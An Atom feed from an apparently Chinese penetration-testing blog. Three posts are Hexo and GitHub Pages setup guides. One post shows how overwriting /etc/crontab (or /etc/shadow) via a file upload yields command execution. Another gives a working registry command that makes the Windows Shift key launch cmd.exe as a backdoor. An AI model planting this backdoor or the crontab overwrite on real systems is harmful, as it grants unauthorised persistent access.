<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>AK-47&#39;s blog</title>
  
  <subtitle>人生不止眼前的苟且，还有代码与远方 . . .</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://ak47-sec.com/"/>
  <updated>2018-05-09T15:24:19.452Z</updated>
  <id>http://ak47-sec.com/</id>
  
  <author>
    <name>AK-47</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Linux通过crontab实现命令执行</title>
    <link href="http://ak47-sec.com/2018/05/09/Linux%E9%80%9A%E8%BF%87crontab%E5%AE%9E%E7%8E%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>http://ak47-sec.com/2018/05/09/Linux通过crontab实现命令执行/</id>
    <published>2018-05-09T14:22:03.000Z</published>
    <updated>2018-05-09T15:24:19.452Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一、计划任务"><a href="#一、计划任务" class="headerlink" title="一、计划任务"></a>一、计划任务</h1><p><body onload="prettyPrint()"></body></p><h2 id="Crontab-周期性任务管理"><a href="#Crontab-周期性任务管理" class="headerlink" title="Crontab 周期性任务管理"></a>Crontab 周期性任务管理</h2><p>主要设置文件：<br>全局配置文件，位于文件：/etc/crontab<br>系统默认的设置，位于目录：/etc/cron.*/<br>用户定义的设置，位于文件：/var/spool/cron/用户名</p><h2 id="etc-crontab"><a href="#etc-crontab" class="headerlink" title="/etc/crontab"></a>/etc/crontab</h2><p>系统任务配置文件。设置维护linux系统所需的任务，由linux系统及相关程序在安装时自动设置<br><img src="crontab-01.jpg" alt="/etc/crontab"></p><h2 id="var-spool-cron"><a href="#var-spool-cron" class="headerlink" title="/var/spool/cron/"></a>/var/spool/cron/</h2><p>由用户自行设置（使用crontab命令）的cron计划任务将被保存到目录/var/spool/cron中，文件名与用户名相同。<br>Eg：root用户的cron计划任务保存在配置文件/var/spool/cron/root中</p><h2 id="常见操作"><a href="#常见操作" class="headerlink" title="常见操作"></a>常见操作</h2><p>1.编辑用户的计划任务列表: crontab -e [-u 用户名]<br>2.查看用户的计划任务列表: crontab -l [-u 用户名]<br>3.删除用户的计划任务列表: crontab -r [-u 用户名]<br><img src="crontab-02.jpg" alt="/etc/crontab"><br><img src="crontab-03.jpg" alt="cmd"></p><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><p>a) 每天早上7:50自动开启sshd服务，22:50关闭sshd服务</p><pre class="prettyprint linenums">50 7 * * * /sbin/service sshd start50 22 * * * /sbin/service sshd stop</pre>b)  每隔5天清空一次FTP服务器公共目录“/var/ftp/pub”中的数据<pre class="prettyprint linenums">0 0 */5 * * /bin/rm -rf /var/ftp/pub/*</pre>c)  每周六的7:30重新启动系统中httpd服务<pre class="prettyprint linenums">30 7 * * 6 /sbin/service httpd restart</pre>d)  每周一、周三、周五下午17:30使用tar命令自动备份/etc/httpd目录<pre class="prettyprint linenums">30 17 * * 1,3,5 /bin/tar jcf httpdconf.tar.bz2 /etc/httpd</pre><h2 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h2><p>crond守护进程会自动检查/etc/crontab文件、/etc/cron.d/目录以及/var/spool/cron目录中的改变，所以修改后无需重启。</p><p>但是测试发现：<strong> crontab -e 命令编辑当前用户的计划任务，所有系统不需要重启，可以直接生效。在 Ubuntu下直接在 /var/spool/cron/crontabs/目录下新建一个用户文件，在该文件中配置计划任务，需要调用 crontab /var/spool/cron/crontabs/root 才能使配置生效。</strong></p><h1 id="二、本地测试"><a href="#二、本地测试" class="headerlink" title="二、本地测试"></a>二、本地测试</h1><h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p>操作系统：Linux kali 4.14.0-kali3-amd64 </p><h2 id="替换-etc-crontab"><a href="#替换-etc-crontab" class="headerlink" title="替换/etc/crontab"></a>替换/etc/crontab</h2><p>本地信件crontab文件，内容如下：<br><img src="crontab-04.jpg" alt="test01"></p><p>使用该文件覆盖掉原有/etc/crontab文件，一分钟后打开/tmp/目录，可以看到生成的logtest.txt文件（无需重启，自动生效）。<br><img src="crontab-05.jpg" alt="test02"></p>]]></content>
    
    <summary type="html">
    
      linux系统一旦存在任意文件上传，便可以通过覆盖/etc/shadow或/etc/crontab来实现任意命令执行.
    
    </summary>
    
      <category term="Linux" scheme="http://ak47-sec.com/categories/Linux/"/>
    
    
      <category term="内网渗透" scheme="http://ak47-sec.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="Linux" scheme="http://ak47-sec.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>shift后门妙用</title>
    <link href="http://ak47-sec.com/2018/03/21/shift%E5%90%8E%E9%97%A8%E5%A6%99%E7%94%A8/"/>
    <id>http://ak47-sec.com/2018/03/21/shift后门妙用/</id>
    <published>2018-03-21T02:06:01.000Z</published>
    <updated>2018-05-01T06:58:51.029Z</updated>
    
    <content type="html"><![CDATA[<p><body onload="prettyPrint()"></body></p><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>在渗透测试中，经常会接触Windows服务器的远程桌面服务，通过界面对服务器进行管理。对于非服务器版本的Windows系统默认只允许一个账户登录。</p><h2 id="表现形式"><a href="#表现形式" class="headerlink" title="表现形式:"></a>表现形式:</h2><blockquote><p>远程登录时使用与原系统相同的账户，原系统将被切换到登录界面(当前用户会被挤掉线)</p></blockquote><p><img src="3-1.jpg" alt="3-1"></p><blockquote><p>使用不同的账户，登录时提示其他用户已登录到此计算机，如下图:</p></blockquote><p><img src="3-2.jpg" alt="3-2"></p><h1 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h1><p>向目标机器植入shift后门，连接成功后5下shift便可弹出cmd shell。命令如下(无需换行)：</p><pre class="prettyprint linenums">REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f</pre><h1 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h1><p>连接后5下shift，截图如下:</p><p><img src="3-3.jpg" alt="3-3"></p>]]></content>
    
    <summary type="html">
    
      对于非服务器版本的Windows系统默认只允许一个账户RDP登录,这里shift后门能为我们提供帮助
    
    </summary>
    
      <category term="AD系列" scheme="http://ak47-sec.com/categories/AD%E7%B3%BB%E5%88%97/"/>
    
    
      <category term="内网渗透" scheme="http://ak47-sec.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="AD" scheme="http://ak47-sec.com/tags/AD/"/>
    
  </entry>
  
  <entry>
    <title>Hexo常用命令</title>
    <link href="http://ak47-sec.com/2018/03/19/Hexo%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <id>http://ak47-sec.com/2018/03/19/Hexo常用命令/</id>
    <published>2018-03-19T08:54:02.000Z</published>
    <updated>2018-03-20T01:11:53.779Z</updated>
    
    <content type="html"><![CDATA[<p><body onload="prettyPrint()"></body></p><h1 id="hexo安装"><a href="#hexo安装" class="headerlink" title="hexo安装"></a>hexo安装</h1><pre class="prettyprint linenums">    npm install hexo -g #安装      npm update hexo -g #升级      hexo init #初始化</pre><h1 id="简写"><a href="#简写" class="headerlink" title="简写"></a>简写</h1><pre class="prettyprint linenums">    hexo n "我的博客" == hexo new "我的博客" #新建文章    hexo p == hexo publish    hexo g == hexo generate #生成    hexo s == hexo server  #启动服务预览    hexo d == hexo deploy #部署</pre><h1 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h1><pre class="prettyprint linenums">    hexo server   # Hexo会监视文件变动并自动更新，您无须重启服务器。    hexo server -s #静态模式    hexo server -p 5000 #更改端口    hexo server -i 192.168.1.1 #自定义 IP    hexo clean   #清除缓存    hexo g   #生成静态网页    hexo d   #开始部署</pre><h1 id="监视文件变动"><a href="#监视文件变动" class="headerlink" title="监视文件变动"></a>监视文件变动</h1><pre class="prettyprint linenums">    hexo generate   #使用 Hexo 生成静态文件快速而且简单    hexo generate --watch   #监视文件变动</pre><h1 id="写作"><a href="#写作" class="headerlink" title="写作"></a>写作</h1><pre><code>hexo new [layout] &lt;title&gt;layout    布局title    标题date    文件建立日期</code></pre><h2 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明"></a>参数说明</h2><p>title: 使用Hexo搭建个人博客<br>layout: post<br>date: 2014-03-03 19:07:43<br>comments: true<br>categories: Blog<br>tags: [Hexo]<br>keywords: Hexo, Blog<br>description: 页面描述信息  </p><h2 id="例如"><a href="#例如" class="headerlink" title="例如"></a>例如</h2><pre class="prettyprint linenums">    hexo new page pageName  #新建页面    hexo new articleName  #新建文章</pre><h1 id="布局文件路径"><a href="#布局文件路径" class="headerlink" title="布局文件路径"></a>布局文件路径</h1><pre class="prettyprint linenums">    post    source/_posts    page    source    draft    source/_drafts</pre><h1 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h1><p>两个命令的作用是相同的：</p><pre class="prettyprint linenums">    hexo generate --deploy    hexo deploy --generate    hexo d  #部署      hexo d -g  #可与hexo g合并为</pre><h1 id="草稿"><a href="#草稿" class="headerlink" title="草稿"></a>草稿</h1><pre class="prettyprint linenums">    hexo publish [layout] <title></title></pre><h1 id="如何卸载Hexo"><a href="#如何卸载Hexo" class="headerlink" title="如何卸载Hexo"></a>如何卸载Hexo</h1><pre class="prettyprint linenums">    npm uninstall hexo-cli -g  #3.0.0版本执行    npm uninstall hexo -g  #旧版本执行</pre><h1 id="友情链接："><a href="#友情链接：" class="headerlink" title="友情链接："></a>友情链接：</h1><p><a href="https://www.jianshu.com/p/05289a4bc8b2" title="如何搭建一个独立博客——简明Github Pages与Hexo教程" target="_blank" rel="noopener">如何搭建一个独立博客——简明Github Pages与Hexo教程</a></p><p><a href="http://wiki.jikexueyuan.com/project/hexo-document/commands.html" title="极客学院Hexo中文版指令" target="_blank" rel="noopener">极客学院Hexo中文版指令</a></p>]]></content>
    
    <summary type="html">
    
      Hexo常用命令
    
    </summary>
    
      <category term="Hexo" scheme="http://ak47-sec.com/categories/Hexo/"/>
    
    
      <category term="Hexo" scheme="http://ak47-sec.com/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>Hexo搭建博客No-II</title>
    <link href="http://ak47-sec.com/2018/03/15/Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2No-II/"/>
    <id>http://ak47-sec.com/2018/03/15/Hexo搭建博客No-II/</id>
    <published>2018-03-15T08:36:09.000Z</published>
    <updated>2018-03-20T02:06:14.112Z</updated>
    
    <content type="html"><![CDATA[<h1 id="创建-Github-域名和仓库"><a href="#创建-Github-域名和仓库" class="headerlink" title="创建 Github 域名和仓库"></a>创建 Github 域名和仓库</h1><p><body onload="prettyPrint()"></body></p><h2 id="注册github账户"><a href="#注册github账户" class="headerlink" title="注册github账户"></a>注册github账户</h2><p>注册一个<a href="https://github.com/" title="注册GitHub账户" target="_blank" rel="noopener">注册GitHub账户</a> 账号，已有的可以直接创建仓库，注册的话注意username，这会影响到你的域名，所以先想好用户名哦。</p><h2 id="创建仓库"><a href="#创建仓库" class="headerlink" title="创建仓库"></a>创建仓库</h2><p>然后创建一个仓库(repository) 来存储我们的网站，点击首页 New repository 按钮创建仓库, Respository name 中的 username.github.io 的 username 一定与前面的 Owner 保持一致。</p><h1 id="设置github-pages"><a href="#设置github-pages" class="headerlink" title="设置github pages"></a>设置github pages</h1><p>创建成功后，回到主页面，点击进入你刚刚创建好的仓库：<br><img src="git1.jpg" alt="git1"><br>接着点击settings，进入仓库管理:<br><img src="git2.jpg" alt="git2"><br>更新你的站点:<br><img src="git3.jpg" alt="git3"><br>选择主题并发布：<br><img src="git4.jpg" alt="git4"><br>至此，github pages就发布成功了。试试在浏览器的地址栏输入”github用户名.github.io” 可以访问到默认页面。</p><h1 id="配置Github"><a href="#配置Github" class="headerlink" title="配置Github"></a>配置Github</h1><p>打开安装好的NodeJS的根目录，然后点击进入刚刚新建的blog文件夹：<br><img src="git5.jpg" alt="git5"><br>现在需要编辑Blog文件夹下的 _config.yml 文件，与自己 Github 账号的 Repository 仓库建立关联。</p><p><strong> 基本配置：</strong><br>修改这几个必须设置的键值对，记得保存，注意配置的键值对之间一定要有空格。</p><pre class="prettyprint linenums">title: xxxx    //网站标题author: xxx   //作者名字language: zh-Hans    //网站使用的语言 中文    deploy:   type: git     repo: https://github.com/username/username.github.io.git   branch: master</pre><p>本人配置信息如下：<br><img src="git6.jpg" alt="git6"></p><p><strong> 注意：</strong><br>repo:[必须有空格]  输入您的Github创建的仓库所对应的URL链接，复制粘贴一下就OK啦。</p><p>接下来，回到你的cmd窗口，只需执行如下命令：</p><pre class="prettyprint">npm install hexo-deployer-git --save （这命令是为了解决hexo新版本的部署问题）hexo g 回车 （这是重新生成blog）hexo d 回车 （这是将本地blog部署到github的仓库）</pre><p>现在，试试在浏览器的地址栏输入”github用户名.github.io”，此时，你应该会看到这样的界面：<br><img src="git7.jpg" alt="git7"></p><h1 id="常见报错"><a href="#常见报错" class="headerlink" title="常见报错"></a>常见报错</h1><h2 id="找不到git部署"><a href="#找不到git部署" class="headerlink" title="找不到git部署"></a>找不到git部署</h2><pre><code>ERROR Deployer not found: git</code></pre><p>解决方法:</p><pre class="prettyprint">npm install hexo-deployer-git --save</pre><h2 id="hexo-d出错"><a href="#hexo-d出错" class="headerlink" title="hexo d出错"></a>hexo d出错</h2><p><img src="hexo_d_error.jpg" alt="error"><br>解决方法:<br><img src="hexo_d_ok.jpg" alt="ok"></p>]]></content>
    
    <summary type="html">
    
      部署博客到github
    
    </summary>
    
      <category term="Hexo" scheme="http://ak47-sec.com/categories/Hexo/"/>
    
    
      <category term="Hexo" scheme="http://ak47-sec.com/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>Hexo搭建博客No.I</title>
    <link href="http://ak47-sec.com/2018/03/14/Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2No-I/"/>
    <id>http://ak47-sec.com/2018/03/14/Hexo搭建博客No-I/</id>
    <published>2018-03-14T09:57:29.000Z</published>
    <updated>2018-03-19T09:32:48.183Z</updated>
    
    <content type="html"><![CDATA[<p><strong>思维导图总览：</strong><br><img src="img1.jpg" alt="思维导图"></p><p><body onload="prettyPrint()"></body><br><strong>什么是Hexo：</strong><br>hexo是Hexo是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p><p><strong>安装Hexo的前置条件：</strong></p><blockquote><p>Node.js <a href="http://www.runoob.com/nodejs/nodejs-install-setup.html" target="_blank" rel="noopener">安装教程</a><br>Git <a href="https://git-scm.com/book/zh/v1/%E8%B5%B7%E6%AD%A5-%E5%AE%89%E8%A3%85-Git" target="_blank" rel="noopener">安装教程</a></p></blockquote><p><strong>Windows用户安装：</strong><br>对于windows用户来说，建议使用安装程序进行安装。安装时，请勾选Add to PATH选项。另外，您也可以使用Git Bash，这是git for windows自带的一组程序，提供了Linux风格的shell，在该环境下，您可以直接用上面提到的命令来安装Node.js。打开它的方法很简单，在任意位置单击右键，选择“Git Bash Here”即可。由于Hexo的很多操作都涉及到命令行，您可以考虑始终使用Git Bash来进行操作。</p><p><strong>安装 Hexo</strong><br>第一步：打开cmd</p><p>第二步：进入NodeJS的安装目录<br><img src="cmd.jpg" alt="NodeJS"><br>第三步：开始安装hexo，利用 npm 命令即可安装。</p><pre class="prettyprint linenums">npm install -g hexo</pre><p>来杯咖啡稍作等待，即可安装成功<br><img src="npm.jpg" alt="npm"><br>第四步：开始搭建博客<br>新建一个文件夹，例如blog，此处blog便是你的博客目录，当然其他什么名字也是极好的，看心情了，此时最好将此目录备份到云盘或者其他地方，以防文件夹丢失后博客就没有了。</p><pre class="prettyprint linenums">mkdir blog && cd blog</pre>进入blog文件夹，右键点击Git Bash Here，接下来执行初始化文件夹命令：<pre class="prettyprint linenums">npm init</pre>安装依赖和插件<pre class="prettyprint linenums">hexo install</pre><p>新建完成后，指定文件夹的目录如下：</p><pre><code>├── _config.yml├── package.json├── scaffolds├── source|   ├── _drafts|   └── _posts└── themes</code></pre><p>第五步：生成静态页面</p><p><pre class="prettyprint linenums">hexo g</pre><br>至此，博客搭建成功！当然，仅仅是本地的</p><p>第六步：启动服务器进行本地预览</p><p><pre class="prettyprint linenums">hexo s  ||  hexo server  || hexo server -p 5000</pre><br>备注：执行3条命令中任何一条均可以，我的4000端口被占用，所以使用5000。</p><p>第七步：本地预览<br>打开浏览器访问 <a href="http://localhost:5000" target="_blank" rel="noopener">http://localhost:5000</a> 访问初始化页面<br><img src="hexo.jpg" alt="NHEXO"></p><p><strong>基础配置</strong><br>现在可以在 _config.yml中修改大部份的配置</p><blockquote><p>参数    描述<br>title    网站标题<br>subtitle    网站副标题<br>description    网站描述<br>author    您的名字<br>language    网站使用的语言<br>timezone    网站时区。Hexo默认使用您电脑的时区,时区列表：America/New_York, Japan, UTC等 </p></blockquote><p><strong>扩展</strong></p><blockquote><p>参数    描述<br>theme    当前主题名称,值为false时禁用主题<br>deploy    部署部分的设置</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;思维导图总览：&lt;/strong&gt;&lt;br&gt;&lt;img src=&quot;img1.jpg&quot; alt=&quot;思维导图&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;body onload=&quot;prettyPrint()&quot;&gt;&lt;/body&gt;&lt;br&gt;&lt;strong&gt;什么是Hexo：&lt;/strong&gt;&lt;br&gt;h
      
    
    </summary>
    
      <category term="Hexo" scheme="http://ak47-sec.com/categories/Hexo/"/>
    
    
      <category term="Hexo" scheme="http://ak47-sec.com/tags/Hexo/"/>
    
  </entry>
  
</feed>
